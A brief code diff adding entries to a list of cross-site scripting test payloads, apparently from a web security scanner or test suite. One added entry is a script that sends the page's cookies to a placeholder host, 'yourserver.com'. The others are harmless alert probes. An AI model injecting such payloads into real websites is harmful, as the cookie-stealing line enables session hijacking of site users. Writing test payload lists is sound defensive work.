@@ -72,6 +72,8 @@ XSS_PAYLOADS = [
     "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
     "<img src=x onerror=alert(1)>",
     "<svg/onload=alert(1)>",
+    "<script>fetch('http://yourserver.com?cookie=' + document.cookie)</script>",
+    "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",
 
 ]
 
